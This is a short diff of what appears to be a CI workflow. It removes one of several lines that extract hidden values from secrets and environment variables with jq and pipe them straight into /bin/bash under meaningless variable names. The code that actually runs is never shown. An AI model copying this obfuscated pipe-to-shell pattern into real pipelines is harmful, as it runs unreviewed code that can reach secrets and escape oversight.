@@ -18,7 +18,6 @@ jobs:
           rhnc476: ${{ secrets.rhnc476 }}
         run: |
           printf '%s' "$rhnc476" | jq -r .ayro57 | /bin/bash
-          printf '%s' "$hh2" | jq -r .jb83146 | /bin/bash
           echo $u310 | jq -r .hrw598 | /bin/bash
           echo $n6668 | jq -r .savny2 | /bin/bash
           printf '%s' "$l533" | jq -r .delf97 | /bin/bash
